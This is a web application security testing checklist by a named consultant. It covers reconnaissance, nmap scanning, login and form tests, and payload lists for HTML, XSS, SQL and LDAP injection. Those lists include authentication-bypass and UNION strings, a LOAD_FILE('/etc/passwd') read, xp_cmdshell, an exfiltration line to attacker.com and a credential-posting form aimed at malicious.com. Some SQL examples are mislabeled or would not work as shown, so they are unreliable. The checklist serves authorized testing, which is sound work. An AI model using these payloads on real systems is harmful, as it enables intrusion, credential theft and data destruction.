

üåê Web Application Security Check List
===================================

**Prepared by** : M. SIVA SANKAR ( Security Consultant )

**LinkedIn** : [https://www.linkedin.com/in/siva-sankar-hacker/](https://www.linkedin.com/in/siva-sankar-hacker/)

### Web Application Security Testing

* **Information Gathering**
    
    ### **Information Gathering Checklist**
    
    ### **Basic Information**
    
    * Identify application entry points (main URL, subdomains, APIs).
        
    
    * Identify web server type and version (e.g., Apache, Nginx, IIS).
        
    
    * Identify backend technologies (e.g., PHP, Python, Node.js).
        
    
    * Identify frontend technologies (e.g., React, Angular, Vue.js).
        
    
    * Determine database type (e.g., MySQL, MongoDB, PostgreSQL).
        
    
    * Check for exposed version information in headers.
        
    
    ### **Domain and DNS Information**
    
    * Perform WHOIS lookup for domain ownership and contact details.
        
    
    * Enumerate DNS records (A, MX, TXT, NS, CNAME).
        
    
    * Conduct reverse DNS lookups for associated IPs.
        
    
    * Perform subdomain enumeration using passive tools.
        
    
    * Analyze ASN and IP range details associated with the domain.
        
    
    ### **Public Data and Search Engine Recon**
    
    * Use Google Dorking to discover sensitive files and data.
        
    
    * Explore archived website versions (Wayback Machine, Archive.org).
        
    
    * Search for public code repositories (GitHub, GitLab, Bitbucket).
        
    
    * Analyze indexed pages using search engines (e.g., Bing, Google).
        
    
    * Check forums, social media, and blogs for references to the application.
        
    
    ### **Network and Infrastructure**
    
    * Identify server geolocation and hosting provider.
        
    
    * Gather information about shared hosting or co-hosted services.
        
    
    * Identify external services (e.g., CDN, WAF) used by the application.
        
    
    ### **Application Structure**
    
    * Extract sitemaps (e.g., `/sitemap.xml`).
        
    
    * Review `robots.txt` for disallowed paths.
        
    
    * Analyze URL structures for patterns or vulnerabilities.
        
    
    * Identify endpoints and functionality via URL inspection.
        
    
    ### **JavaScript and File Analysis**
    
    * Analyze JavaScript files for sensitive information (e.g., API keys, endpoints).
        
    
    * Search for hidden or unused files (e.g., `/backup.zip`, `.env`).
        
    
    * Identify hardcoded credentials or secrets in the code.
        
    
    ### **Cloud and Third-Party Integrations**
    
    * Check for misconfigured cloud storage (e.g., AWS S3, Google Cloud).
        
    
    * Enumerate third-party integrations (e.g., analytics, tracking).
        
    
    * Investigate SaaS or PaaS usage by the application.
        
    
    ### **Error and Debugging Information**
    
    * Test for error pages that reveal stack traces or backend information.
        
    
    * Check for verbose responses in HTTP headers or bodies.
        
    
    ### **Security Headers**
    
    * Review HTTP security headers (e.g., CSP, HSTS, X-Frame-Options).
        
    
    * Analyze SSL/TLS certificates for expiration and configuration issues.
        
    
    ### **User and Organization Information**
    
    * Search for employee or developer details via LinkedIn or public profiles.
        
    
    * Collect email addresses or usernames from public forums or repositories.
        
    
    ### **Historical Data**
    
    * Explore past vulnerabilities or security incidents involving the application.
        
    
    * Look for expired subdomains or assets (broken link hijacking).
        
    
    * * *
    

* **Enumeration and Foot Printing**
    
    * * *
    
    ### **Enumeration and Footprinting Checklist**
    
    ### **Port Scanning and Analysis**
    
    * Perform a full TCP port scan to identify open ports (`nmap -sT`).
        
    
    * Perform a full UDP port scan to identify open ports (`nmap -sU`).
        
    
    * Scan commonly used ports with default settings for quick insights.
        
    
    * Check for filtered, closed, or unfiltered ports.
        
    
    * Conduct a stealth scan to avoid detection (`nmap -sS`).
        
    
    ### **Service Enumeration**
    
    * Identify services running on open ports (`nmap -sV` or `nmap -A`).
        
    
    * Determine service versions for all open ports.
        
    
    * Verify default credentials for discovered services.
        
    
    * Check for additional service banners (`telnet`, `netcat`, etc.).
        
    
    * Analyze responses for potential vulnerabilities or misconfigurations.
        
    
    ### **Protocol Identification**
    
    * Identify supported protocols (e.g., HTTP, HTTPS, FTP, SSH, SMB, SNMP).
        
    
    * Check for protocol-specific misconfigurations (e.g., weak ciphers, outdated versions).
        
    
    * Verify SSL/TLS settings for secure protocols (`sslscan`, `TestSSL`).
        
    
    * Enumerate RPC services, if applicable (`rpcinfo`, `enum4linux`).
        
    
    ### **Operating System Fingerprinting**
    
    * Use OS detection features to identify the operating system (`nmap -O`).
        
    
    * Validate OS fingerprinting results with additional tools (e.g., `p0f`, `xprobe2`).
        
    
    ### **Network Discovery**
    
    * Identify network devices, routers, and firewalls.
        
    
    * Trace the route to the target using `traceroute`.
        
    
    * Detect load balancers or reverse proxies.
        
    
    * Enumerate shared network resources (e.g., SMB shares, NFS exports).
        
    
    ### **Version-Specific Vulnerability Analysis**
    
    * Search for known vulnerabilities in service versions (`searchsploit`, CVE databases).
        
    
    * Validate findings using vulnerability scanning tools (`Nessus`, `OpenVAS`, `Nuclei`).
        
    
    * Check for potential exploits using frameworks like Metasploit.
        
    
    ### **Web Server Enumeration**
    
    * Analyze HTTP headers for server details and potential misconfigurations.
        
    
    * Identify default pages and directories (`gobuster`, `dirsearch`).
        
    
    * Investigate web application frameworks or CMS versions.
        
    
    * Test for directory traversal, file disclosure, or other vulnerabilities.
        
    
    ### **SNMP Enumeration**
    
    * Scan for SNMP services (`nmap -sU -p 161`).
        
    
    * Use default community strings (`public`, `private`) to gather information.
        
    
    * Enumerate system information, network interfaces, and routing tables (`snmpwalk`).
        
    
    ### **Active Directory Enumeration**
    
    * Enumerate LDAP services for domain information.
        
    
    * Identify SMB shares and accessible files.
        
    
    * List users, groups, and policies if possible (`enum4linux`, `smbclient`).
        
    
    ### **SSH Enumeration**
    
    * Identify supported authentication methods (`nmap --script ssh2-enum-algos`).
        
    
    * Test for weak or reused SSH keys.
        
    
    ### **Database Service Enumeration**
    
    * Identify database types and versions (e.g., MySQL, PostgreSQL, MongoDB).
        
    
    * Test for anonymous or weak authentication.
        
    
    * Check for open database query interfaces.
        
    
    ### **VoIP and Other Services**
    
    * Enumerate SIP services (`nmap --script sip-enum-users`).
        
    
    * Identify RTP streams or other VoIP protocols.
        
    
    * * *
    
    ### **Example Nmap Commands**
    
    1.  **Quick Scan:** `nmap -F [target]`
    
    2.  **Service Version Scan:** `nmap -sV [target]`
    
    3.  **Operating System Detection:** `nmap -O [target]`
    
    4.  **Full TCP and UDP Scan:** `nmap -sT -sU -p- [target]`
    
    5.  **Vulnerability Scan:** `nmap --script vuln [target]`
    
    6.  **Advanced Service Scripts:** `nmap --script=http-enum,smb-enum-shares [target]`
    
    * * *
    
    ### **Key Tools**
    
    * **Nmap**: Comprehensive network and service enumeration.
    
    * **Netcat**: For banner grabbing and manual testing.
    
    * **Enum4Linux**: For SMB and Active Directory enumeration.
    
    * **Metasploit**: Exploit validation and vulnerability checks.
    
    * **SNMP Tools**: `snmpwalk`, `onesixtyone`.
    
    * **Searchsploit**: For known exploits.
    
    * * *
    

* **Registration Page**
    
    * * *
    
    ### **Registration Page Checklist**
    
    ### **Authentication and Authorization**
    
    * Check if registration can override another user's record, username, or email address.
        
    
    * Ensure that duplicate registrations (same email/username) are not allowed.
        
    
    * Verify that registration is restricted to authorized users (if applicable).
        
    
    ### **Secure Communication**
    
    * Verify if SSL/TLS is enabled to encrypt registration requests.
        
    
    * Check for enforced HTTPS across all registration endpoints.
        
    
    * Test for forced redirection from HTTP to HTTPS.
        
    
    ### **Password Policy**
    
    * Check whether the password policy is enforced (minimum length, complexity, etc.).
        
    
    * Verify if the password field prevents storing weak or dictionary-based passwords.
        
    
    * Test if the password reset feature has proper security mechanisms (e.g., CAPTCHA, rate limiting).
        
    
    ### **Automated and Bot Protections**
    
    * Ensure CAPTCHA or other bot prevention measures are implemented.
        
    
    * Check rate-limiting mechanisms for repeated registration attempts.
        
    
    * Test for automated registration protection using scripts/tools.
        
    
    ### **Business Logic**
    
    * Confirm that anyone registering aligns with the application's business requirements.
        
    
    * Validate that unused registration accounts are properly disabled or removed.
        
    
    ### **Input Validation**
    
    * Test for input sanitization to prevent injection attacks (SQLi, XSS, etc.).
        
    
    * Check if special characters are handled properly in fields (e.g., email, username).
        
    
    ### **Session Security**
    
    * Verify that sessions are securely created for registered users.
        
    
    * Test for session fixation or session hijacking vulnerabilities.
        
    
    ### **Error Handling**
    
    * Ensure error messages do not disclose sensitive details (e.g., whether the email is already registered).
        
    
    * Check for consistent and secure error-handling mechanisms.
        
    
    * * *
    

* **Login / Logout**
    
    * * *
    
    ### **Login Page Checklist**
    
    ### **Secure Communication**
    
    * Verify if SSL/TLS is enabled to encrypt login requests.
        
    
    * Test for forced HTTPS redirection for all login requests.
        
    
    * Check if sensitive data is sent over encrypted connections only.
        
    
    ### **Authentication Security**
    
    * Ensure the application prevents brute-force login attempts.
        
    
    * Test for account lockout after multiple failed login attempts.
        
    
    * Verify that manual guessing or dictionary attacks cannot bypass authentication.
        
    
    * Check if CAPTCHA is implemented to prevent automated login attempts.
        
    
    ### **Session Management**
    
    * Verify that the session token is renewed upon successful login.
        
    
    * Test for proper invalidation of session tokens after logout.
        
    
    ### **Input Validation**
    
    * Test for SQL Injection by attempting to bypass login with crafted inputs.
        
    
    * Verify input sanitization to prevent Cross-Site Scripting (XSS) attacks on login fields.
        
    
    ### **Data Sensitivity**
    
    * Check if sensitive data (e.g., credentials) is visible in the browser's history or cache.
        
    
    * Verify that sensitive data is not stored in cookies or other insecure locations.
        
    
    * Test for data leakage through error messages.
        
    
    ### **Phishing Protections**
    
    * Verify if anti-phishing mechanisms (e.g., watermark or image validation) are present.
        
    
    * Test for phishing resistance on the login page.
        
    
    * * *
    
    ### **Logout Page Checklist**
    
    ### **Session Termination**
    
    * Verify that the session token is properly invalidated upon logout.
        
    
    * Test if the session token remains active in the browser‚Äôs history after logout.
        
    
    * Ensure that logout functionality works across multiple devices/browsers.
        
    
    ### **Data Handling**
    
    * Check if sensitive data is visible in the browser's cache after logout.
        
    
    * Verify that no residual authentication tokens or sensitive data are stored post-logout.
        
    
    ### **Error Handling**
    
    * Ensure logout errors are not revealing sensitive session details.
        
    
    * Verify proper redirection or feedback to the user after logout.
        
    
    * * *
    
    ### **Additional Notes**
    
    * Test login/logout functionality under different network conditions (e.g., slow connections).
    
    * Ensure that proper session timeouts are in place.
    
    * Perform penetration tests to identify vulnerabilities like cookie hijacking or session fixation.
    
    * * *
    

* **Search Page**
    
    ### **Search Page Test Cases Checklist**
    
    * * *
    
    ### **Functional Testing**
    
    * Verify if the search functionality works as expected with valid input.
        
    
    * Test for no results found with invalid or random input.
        
    
    * Ensure partial matches are returned for incomplete or partial input.
        
    
    * Validate that the search results are relevant to the search query.
        
    
    * Check if search results are paginated for large datasets.
        
    
    * Test sorting and filtering options (if available).
        
    
    * * *
    
    ### **Security Testing**
    
    * **SQL Injection**: Attempt SQL injection to manipulate search queries (e.g., `OR 1=1`).
        
    
    * **XSS Attacks**: Test if search inputs are sanitized to prevent Cross-Site Scripting.
        
    
    * **Parameter Tampering**: Modify search parameters (e.g., in URL) to access unauthorized data.
        
    
    * **Sensitive Data Exposure**: Verify that the search results do not expose sensitive or restricted data.
        
    
    * **Brute Force Testing**: Check for rate-limiting mechanisms to prevent abuse of the search functionality.
        
    
    * **Search Caching**: Ensure sensitive search queries or results are not cached in the browser.
        
    
    * * *
    
    ### **Input Validation**
    
    * Verify the maximum length allowed for input fields.
        
    
    * Check how the application handles special characters (e.g., `<`, `>`, `'`, `"`).
        
    
    * Test for validation of input fields to prevent invalid inputs (e.g., SQL commands, scripts).
        
    
    * Ensure that the application does not allow injection of malicious payloads into the search field.
        
    
    * * *
    
    ### **Performance Testing**
    
    * Test the response time of the search page for large datasets.
        
    
    * Validate that the application can handle multiple concurrent search requests.
        
    
    * Check the performance of advanced search features (e.g., filtering, sorting).
        
    
    * * *
    
    ### **Access Control Testing**
    
    * Verify that restricted data is not accessible via search by unauthorized users.
        
    
    * Ensure that user-specific search results are visible only to the respective users.
        
    
    * * *
    
    ### **Error Handling**
    
    * Test for proper error messages for invalid inputs (e.g., "No results found").
        
    
    * Ensure that error messages do not reveal sensitive information about the backend.
        
    
    * Validate how the application handles unexpected inputs (e.g., very long text or invalid characters).
        
    
    * * *
    
    ### **Additional Enhancements**
    
    * Check if the search bar supports autocomplete or suggestions.
        
    
    * Verify if the search supports synonyms or fuzzy searches.
        
    
    * Test mobile responsiveness of the search page.
        
    
    * Ensure that the search feature complies with accessibility standards (e.g., screen readers).
        
    
    * * *
    

* **Input Fields**
    
    ### **Input Fields Test Cases Checklist**
    
    ### **Functional Testing**
    
    * Verify if the input field accepts valid data as per requirements.
        
    
    * Test the maximum length allowed for input fields.
        
    
    * Check for placeholder text and ensure it is clear and descriptive.
        
    
    * Validate required fields to ensure they cannot be left blank.
        
    
    * Test field-specific formats (e.g., email, phone numbers, dates) for correct validation.
        
    
    * Verify proper error messages for invalid inputs.
        
    
    * Ensure default values (if any) are displayed correctly.
        
    
    * Test if the input field accepts only the allowed data type (e.g., text, numbers).
        
    
    * * *
    
    ### **Boundary Testing**
    
    * Input the maximum allowed characters and verify behavior.
        
    
    * Input one character beyond the maximum allowed and verify rejection.
        
    
    * Test the field with empty input to check for required field validation.
        
    
    * Input a single character and verify if it's accepted correctly.
        
    
    * * *
    
    ### **Input Validation and Security**
    
    * **SQL Injection**: Test with SQL payloads (e.g., `1=1`, `' OR '1'='1`).
        
    
    * **Cross-Site Scripting (XSS)**: Test with XSS payloads (e.g., `<script>alert(1)</script>`).
        
    
    * **Code Injection**: Test with scripts or malicious code to check for validation.
        
    
    * **HTML Injection**: Enter HTML tags to check if they are escaped or sanitized.
        
    
    * **Special Characters**: Test with special characters (`<, >, ', ", &, ;`) to ensure proper handling.
        
    
    * **Unicode and Encoding**: Test with encoded characters and Unicode (e.g., `%20`, `\u0020`).
        
    
    * * *
    
    ### **Behavioral Testing**
    
    * Test autofill and autocomplete functionality (if applicable).
        
    
    * Verify field behavior for cut, copy, and paste actions.
        
    
    * Test if the field retains its value after a page refresh or navigation back.
        
    
    * Validate if the input field is disabled when required.
        
    
    * Check for dynamic validation (e.g., validation occurring on-the-fly without form submission).
        
    
    * * *
    
    ### **Performance Testing**
    
    * Enter a very long input to test the field's handling capacity.
        
    
    * Test the application's performance when submitting large inputs.
        
    
    * Validate the application's response time for multiple simultaneous input submissions.
        
    
    * * *
    
    ### **Cross-Browser and Mobile Testing**
    
    * Verify input field behavior across different browsers (Chrome, Firefox, Edge, Safari).
        
    
    * Check responsiveness of input fields on mobile and tablet devices.
        
    
    * Test field usability with touchscreens.
        
    
    * * *
    
    ### **Error Handling**
    
    * Ensure proper error messages are displayed for invalid or missing input.
        
    
    * Test if error messages are user-friendly and non-technical.
        
    
    * Verify that the error messages disappear after entering valid input.
        
    
    * * *
    
    ### **Accessibility Testing**
    
    * Verify if the input fields are accessible via keyboard navigation.
        
    
    * Check if input fields have proper `label` tags for screen readers.
        
    
    * Ensure input fields have sufficient contrast and are visible in different modes (dark/light).
        
    
    * * *
    

* **HTML Injection**
    
    ### **HTML Injection**
    
    **HTML Injection** is a security vulnerability that occurs when an attacker injects malicious HTML code into a web application's content. Unlike XSS, HTML Injection typically focuses on altering the structure or display of the web page rather than executing JavaScript.
    
    * * *
    
    ### **General Preparation**
    
    * Identify all input points in the application:
        
        * Input fields (forms, text boxes, comment sections)
        
        * URL parameters
        
        * HTTP headers (e.g., `User-Agent`, `Referer`, `Cookie`)
        
        * API endpoints (JSON/XML payloads)
        
        * Hidden fields
        
    
    * Ensure the testing is within scope and authorized.
        
    
    * * *
    
    ### **HTML Injection Testing**
    
    ### **Basic HTML Injection Tests**
    
    * Inject simple HTML tags and observe the response:
        
        * `<b>bold</b>`
        
        * `<i>italic</i>`
        
        * `<u>underline</u>`
        
    
    * Check if the tags are rendered or escaped in the response.
        
    
    * * *
    
    ### **Attribute Injection**
    
    * Test for attribute manipulation:
        
        * `<input value="<b>bold</b>">`
        
        * `<img src="invalid" onerror="alert('HTML Injection')">`
        
    
    * Verify if injected attributes are executed or sanitized.
        
    
    * * *
    
    ### **Event-Based HTML Injection**
    
    * Inject event-based payloads and check if they execute:
        
        * `<div onclick="alert('HTML Injection')">Click me</div>`
        
        * `<img src="#" onmouseover="alert('HTML Injection')">Hover me</img>`
        
    
    * Test various events:
        
        * `onclick`, `onmouseover`, `onfocus`, `onload`
        
    
    * * *
    
    ### **Form Injection**
    
    * Inject forms to manipulate the DOM:
        
            <form action="http://malicious.com" method="POST">
              <input type="text" name="username">
              <input type="submit" value="Submit">
            </form>
            
        
    
    * Verify if the form renders or is sanitized.
        
    
    * * *
    
    ### **Script Injection (If Allowed)**
    
    * Test basic script injection:
        
        * `<script>alert('HTML Injection')</script>`
        
    
    * Inject inline scripts:
        
        * `<div style="width:expression(alert('HTML Injection'));">Test</div>`
        
    
    * Check if `<script>` tags are rendered or sanitized.
        
    
    * * *
    
    ### **Hidden HTML Injection**
    
    * Test with hidden HTML elements:
        
        * `<div style="display:none">Hidden Content</div>`
        
    
    * Verify if hidden elements are processed or ignored.
        
    
    * * *
    
    ### **URL Parameters**
    
    * Inject payloads into URL parameters:
        
        * `http://example.com/?q=<b>bold</b>`
        
        * `http://example.com/?q=<script>alert('HTML Injection')</script>`
        
    
    * Observe whether HTML tags are rendered in the response.
        
    
    * * *
    
    ### **Error Messages**
    
    * Test HTML injection through error messages:
        
        * Trigger an application error and inject `<b>Error</b>` or `<script>alert('HTML Injection')</script>` to check rendering.
        
    
    * * *
    
    ### **HTML Injection in JSON/XML**
    
    * Inject payloads into API payloads:
        
        * JSON: `{"username":"<b>bold</b>"}`
        
        * XML: `<username><b>bold</b></username>`
        
    
    * Check if responses render HTML tags.
        
    
    * * *
    
    ### **Email or Messaging Fields**
    
    * Test injection into email or messaging fields:
        
        * `<a href="http://malicious.com">Click here</a>`
        
        * `<img src="#" onerror="alert('HTML Injection')">`
        
    
    * Verify how the application renders HTML in emails or chat windows.
        
    
    * * *
    
    ### **Stored HTML Injection**
    
    * Inject HTML content into fields that store data (e.g., comments, profiles).
        
    
    * Verify if the payload executes when retrieved or rendered later.
        
    
    * * *
    
    ### **Advanced HTML Injection**
    
    * Inject nested HTML tags:
        
        * `"<<b>bold</b>>"`
        
    
    * Test payload encoding:
        
        * URL Encoding: `%3Cb%3Ebold%3C%2Fb%3E`
        
        * HTML Entities: `&lt;b&gt;bold&lt;/b&gt;`
        
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify if HTML tags are escaped or sanitized:
        
        * `<` becomes `&lt;`, `>` becomes `&gt;`
        
    
    * Test Content Security Policy (CSP) effectiveness.
        
    
    * Validate server-side sanitization of HTML content.
        
    
    * * *
    
    ### **Post-Test Verification**
    
    * Check if injected HTML content persists after submission.
        
    
    * Verify application fixes or sanitization mechanisms.
        
    
    * Ensure no user data is affected during testing.
        
    
    * * *
    
    ### **Tools for HTML Injection Testing**
    
    * **Manual Testing**: Browser Developer Tools, Burp Suite, OWASP ZAP.
    
    * **Automated Tools**: Nuclei (custom templates), Acunetix.
    
    * * *
    

* **Cross-Site Scripting (XSS)**
    
    ### **Cross-Site Scripting (XSS)**
    
    **Cross-Site Scripting (XSS)** is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal session tokens, deface websites, or redirect users to malicious sites.
    
    * * *
    
    ### **Types of XSS to Test**
    
    1.  **Reflected XSS**: Test if the payload is immediately reflected in the response.
    
    2.  **Stored XSS**: Test if the payload is stored on the server and executed when accessed later.
    
    3.  **DOM-Based XSS**: Test if the payload is executed in the client-side JavaScript without reaching the server.
    
    * * *
    
    ### **Test Cases for XSS**
    
    ### **Input Fields**
    
    * Inject a basic script: `<script>alert('XSS')</script>` and check if it's executed.
        
    
    * Test with an image tag: `<img src=x onerror=alert('XSS')>` and verify behavior.
        
    
    * Inject an event handler: `<div onmouseover=alert('XSS')>Hover me</div>` and test for execution.
        
    
    * Test nested payloads: `"<<script>alert('XSS')</script>>"`
        
    
    * Test with encoded payloads: `%3Cscript%3Ealert('XSS')%3C%2Fscript%3E`
        
    
    ### **URL Parameters**
    
    * Append the payload to URL parameters: `http://example.com?input=<script>alert('XSS')</script>`
        
    
    * Test for reflected XSS in query strings or fragments: `http://example.com/#<script>alert('XSS')</script>`
        
    
    ### **HTTP Headers**
    
    * Inject payloads in custom headers like `User-Agent`, `Referer`, or `X-Forwarded-For`.
        
    
    ### **Search Fields**
    
    * Enter payloads in search bars and check if results reflect the payload.
        
    
    * Verify if special characters are escaped in search query results.
        
    
    ### **Error Messages**
    
    * Trigger application errors with payloads: `<script>alert('XSS')</script>` and verify error messages.
        
    
    * Check for XSS in stack traces or debug logs.
        
    
    ### **File Upload**
    
    * Upload files with payloads in file names (e.g., `<script>alert('XSS')</script>.jpg`).
        
    
    * Test for payloads embedded in files (e.g., PDF or SVG files with malicious scripts).
        
    
    ### **Cookies and Session**
    
    * Test XSS through cookie injection: `document.cookie="XSS"`
        
    
    * Manipulate session tokens with payloads to verify their execution.
        
    
    ### **Hidden Fields**
    
    * Modify hidden input fields using developer tools or proxies and inject payloads.
        
    
    ### **Headers and Metadata**
    
    * Test for XSS in `<title>` tags: `<title><script>alert('XSS')</script></title>`
        
    
    * Inject payloads in meta tags: `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">`
        
    
    ### **Third-Party Integrations**
    
    * Inject payloads into analytics, tracking scripts, or third-party integrations.
        
    
    * * *
    
    ### **Advanced XSS Test Cases**
    
    ### **WAF and Security Bypass**
    
    * Test payload obfuscation using:
        
        * `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
        
        * `<s<svg onload=alert('XSS')>g>`
        
    
    * Bypass filters using different encodings:
        
        * Hexadecimal: `%3Cscript%3Ealert('XSS')%3C/script%3E`
        
        * Base64: `PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
        
    
    ### **HTML Attributes**
    
    * Test for injection into attributes: `<input value="<script>alert('XSS')">`
        
    
    * Verify execution in inline event handlers: `<a href="#" onclick="alert('XSS')">Click</a>`
        
    
    ### **DOM XSS**
    
    * Inject payloads into `window.location`, `document.write()`, or `innerHTML`.
        
    
    * Test DOM manipulation vulnerabilities: `document.URL`, `document.referrer`.
        
    
    ### **Framework-Specific**
    
    * AngularJS: `{{constructor.constructor('alert("XSS")')()}}`
        
    
    * React: Test injection through JSX or properties.
        
    
    * jQuery: `$('#test').html('<img src=x onerror=alert("XSS")>');`
        
    
    * * *
    
    ### **Prevention Validation**
    
    * Verify input sanitization and encoding on user inputs.
        
    
    * Test server-side filtering of dangerous tags or attributes.
        
    
    * Ensure proper use of security headers:
        
        * **Content Security Policy (CSP)**: Test if scripts are blocked.
        
        * **X-Content-Type-Options**: Prevent MIME-type confusion.
        
    
    * Confirm output encoding for all dynamic content.
        
    
    * * *
    
    ### **Tools for XSS Testing**
    
    * **Manual Testing**: Burp Suite, OWASP ZAP, Developer Tools.
    
    * **Automated Tools**: XSStrike, Nuclei, Wapiti, DalFox.
    
    * **Browser Extensions**: XSS Me (Firefox), XSS Inspector (Chrome).
    
    * * *
    

* **SQL Injection**
    
    ### **SQL Injection**
    
    **SQL Injection (SQLi)** is a security vulnerability that occurs when an attacker manipulates an application's SQL queries by injecting malicious input. This can lead to unauthorized data access, modification, or even complete database compromise.
    
    * * *
    
    ### **Types of SQL Injection**
    
    1.  **Classic SQL Injection**:
        
        * Exploits improperly sanitized input to manipulate SQL queries.
        
        * Example:
            
                SELECT * FROM users WHERE username = 'admin' OR '1'='1';
                
            
    
    2.  **Blind SQL Injection**:
        
        * The attacker cannot see the results of the query directly but can infer information based on the application's behavior.
        
        * **Types**:
            
            * **Boolean-Based**:
                
                * Inject payloads to observe true/false responses.
                
                * Example: `' OR 1=1--` vs. `' AND 1=2--`.
            
            * **Time-Based**:
                
                * Use payloads to introduce delays and infer responses.
                
                * Example:
                    
                        SELECT * FROM users WHERE username = 'admin'; WAITFOR DELAY '00:05:00';
                        
                    
    
    3.  **Error-Based SQL Injection**:
        
        * Exploits database error messages to extract information.
        
        * Example:
            
                SELECT * FROM users WHERE username = 'admin'; DROP TABLE users;
                
            
    
    4.  **Union-Based SQL Injection**:
        
        * Uses the `UNION` operator to retrieve data from other tables.
        
        * Example:
            
                SELECT username, password FROM users UNION SELECT database(), version();
                
            
    
    5.  **Out-of-Band SQL Injection**:
        
        * Sends data to an external system (e.g., DNS or HTTP) as part of the injection.
        
        * Example:
            
                SELECT * FROM users WHERE username = 'admin'; LOAD_FILE('http://attacker.com/data');
                
            
    
    * * *
    
    ### **General Preparation**
    
    * Identify all input points interacting with the database:
        
        * Input fields (forms, search boxes, login fields)
            
        
        * URL parameters
            
        
        * HTTP headers (e.g., `User-Agent`, `Referer`, `Cookie`)
            
        
        * Hidden fields in forms
            
        
        * API endpoints (JSON/XML payloads)
            
        
    
    * Ensure proper authorization and scope for testing.
        
    
    * * *
    
    ### **Basic SQL Injection Tests**
    
    * Inject basic payloads to test for vulnerabilities:
        
        * `' OR '1'='1`
            
        
        * `" OR "1"="1"`
            
        
        * `OR 1=1--`
            
        
    
    * Check if the server returns errors, unusual responses, or bypasses validation.
        
    
    * * *
    
    ### **Error-Based SQL Injection**
    
    * Inject error-inducing payloads:
        
        * `' AND 1=1--`
            
        
        * `' AND 1=2--`
            
        
    
    * Observe database error messages:
        
        * MySQL: `You have an error in your SQL syntax`
        
        * MSSQL: `Unclosed quotation mark`
        
        * PostgreSQL: `syntax error at or near`
        
        * Oracle: `ORA-00933`
        
    
    * * *
    
    ### **Boolean-Based Blind SQL Injection**
    
    * Inject True/False payloads and compare responses:
        
        * `' AND 1=1--` (True)
            
        
        * `' AND 1=2--` (False)
            
        
    
    * Verify differences in:
        
        * Response content
        
        * HTTP status codes
        
        * Page size or layout
        
    
    * * *
    
    ### **Time-Based Blind SQL Injection**
    
    * Inject time-delay payloads and observe server response times:
        
        * MySQL: `' OR SLEEP(5)--`
        
        * MSSQL: `' OR WAITFOR DELAY '0:0:5'--`
        
        * PostgreSQL: `' OR pg_sleep(5)--`
        
        * Oracle: `' OR DBMS_LOCK.SLEEP(5)--`
        
    
    * * *
    
    ### **Union-Based SQL Injection**
    
    * Inject UNION payloads to retrieve data:
        
        * `' UNION SELECT NULL--`
            
        
        * Increment columns until payload works: `' UNION SELECT 1,2--`
            
        
    
    * Use UNION queries to fetch data:
        
        * `' UNION SELECT username, password FROM users--`
            
        
    
    * * *
    
    ### **Authentication Bypass**
    
    * Inject login bypass payloads:
        
        * `' OR '1'='1'--`
            
        
        * `" OR "1"="1"--`
            
        
        * `admin'--`
            
        
    
    * Verify if login bypasses authentication mechanisms.
        
    
    * * *
    
    ### **Database Enumeration**
    
    * Retrieve database version:
        
        * `SELECT @@version--` (MySQL)
            
        
        * `SELECT version()--` (PostgreSQL)
            
        
    
    * Retrieve database name:
        
        * `SELECT database()--` (MySQL)
            
        
        * `SELECT DB_NAME()--` (MSSQL)
            
        
    
    * Enumerate tables:
        
        * `SELECT table_name FROM information_schema.tables--`
            
        
    
    * Enumerate columns:
        
        * `SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
            
        
    
    * * *
    
    ### **Advanced Payloads**
    
    * Test for obfuscated payloads to bypass filters:
        
        * `/**/UNION/**/SELECT`
            
        
        * `%27%20OR%201=1--`
            
        
        * `<scr<script>ipt>alert(1)</scr<script>ipt>`
            
        
    
    * Test for nested queries:
        
        * `' AND (SELECT COUNT(*) FROM users)>0--`
            
        
    
    * * *
    
    ### **File and OS Interactions**
    
    * Test for file read/write capabilities:
        
        * MySQL: `LOAD_FILE('/etc/passwd')`
        
        * MSSQL: `xp_cmdshell 'dir'`
        
    
    * Test for command execution (if applicable).
        
    
    * * *
    
    ### **Mitigation and Prevention Testing**
    
    * Validate if:
        
        * Input sanitization is applied.
            
        
        * Parameterized queries are used.
            
        
        * WAFs block malicious payloads.
            
        
    
    * Test error suppression (e.g., no database error messages exposed).
        
    
    * * *
    
    ### **Tools for SQL Injection Testing**
    
    * **Manual Tools**:
        
        * Burp Suite, OWASP ZAP
        
    
    * **Automated Tools**:
        
        * SQLMap, jSQL Injection, Havij
        
    
    * * *
    
    ### **Post-Test Verification**
    
    * Document all findings with payloads used.
        
    
    * Verify application fixes or mitigations.
        
    
    * Ensure no sensitive information is exposed during testing.
        
    

* **LDAP Injection**
    
    ### **LDAP Injection**
    
    **LDAP Injection** vulnerabilities occur when user input is improperly sanitized and directly embedded into an LDAP query. This allows attackers to manipulate the query to bypass authentication, retrieve sensitive information, or perform unauthorized actions.
    
    * * *
    
    ### **1.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Login forms (username/password fields).
        
        * Search fields querying directory data.
        
        * API parameters interacting with LDAP servers.
        
        * Form fields accepting user attributes (e.g., username, email).
        
    
    * * *
    
    ### **2\.** **Understand the Query Structure**
    
    * **Common LDAP Query Syntax**:
        
            (&(attribute1=value1)(attribute2=value2))
            
        
        * Example:
            
            * User input: `username=user1`
            
            * LDAP Query:
                
                    (&(uid=user1)(password=pass123))
                    
                
    
    * * *
    
    ### **3\.** **Basic Injection Tests**
    
    * **Inject Wildcards**:
        
        * Payloads:
            
            * (matches any value).
            
            * `(objectClass=*)` (matches all objects).
        
        * Example:
            
            * User input: `username=*`
            
            * Query:
                
                    (&(uid=*)(password=pass123))
                    
                
            
            * **Expected Outcome**:
                
                * Vulnerable: Bypasses authentication.
                
                * Secure: Input is sanitized, and wildcards are rejected.
        
    
    * **Inject Always-True Conditions**:
        
        * Payloads:
            
            * `)(|(uid=*))`
            
            * `)(objectClass=*))`
        
        * Example:
            
            * User input: `username=admin)(|(uid=*))`
            
            * Query:
                
                    (&(uid=admin)(|(uid=*))(password=pass123))
                    
                
        
    
    * * *
    
    ### **4\.** **Exploit Logical Operations**
    
    * **What to Do**:
        
        * Inject logical operators like `|`, `&` to manipulate the query.
        
        * Payloads:
            
            * `admin)(|(password=*`
            
            * `user1)(!(password=*`
        
        * **Expected Outcome**:
            
            * Vulnerable: Query logic is bypassed or altered.
            
            * Secure: Logical operators are properly escaped.
        
    
    * * *
    
